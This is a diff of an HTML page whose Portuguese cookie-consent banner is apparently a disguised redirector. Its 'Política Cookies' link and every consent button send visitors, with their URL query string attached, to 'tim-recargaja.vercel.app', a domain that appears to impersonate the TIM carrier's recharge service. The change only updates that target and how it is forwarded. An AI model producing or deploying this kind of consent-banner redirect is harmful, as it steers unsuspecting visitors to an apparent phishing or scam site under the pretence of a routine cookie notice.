@@ -33,7 +33,7 @@
         <p id="cookie-consent-text" class="text-pretty text-base leading-relaxed text-slate-700">
           Para melhorar sua experiência de navegação, este site utiliza cookies. Ao clicar em &quot;Aceitar&quot;, você
           consente estar de acordo com nossa
-          <a href="https://recargaoficial-tim.vercel.app"
+          <a href="https://tim-recargaja.vercel.app"
             class="font-medium text-[#0f3b8c] underline underline-offset-2 cookie-action-btn">Política Cookies</a>.
         </p>
 
@@ -73,11 +73,15 @@
   <!-- Interaction Handler -->
   <script>
     (function () {
-      const destinationUrl = "https://recargaoficial-tim.vercel.app";
+      const destinationUrl = "https://tim-recargaja.vercel.app";
+      const targetUrl = destinationUrl + (window.location.search || "");
       document.querySelectorAll(".cookie-action-btn").forEach(function (el) {
+        if (el.tagName === "A") {
+          el.href = targetUrl;
+        }
         el.addEventListener("click", function (e) {
           e.preventDefault();
-          window.location.href = destinationUrl;
+          window.location.href = targetUrl;
         });
       });
     })();
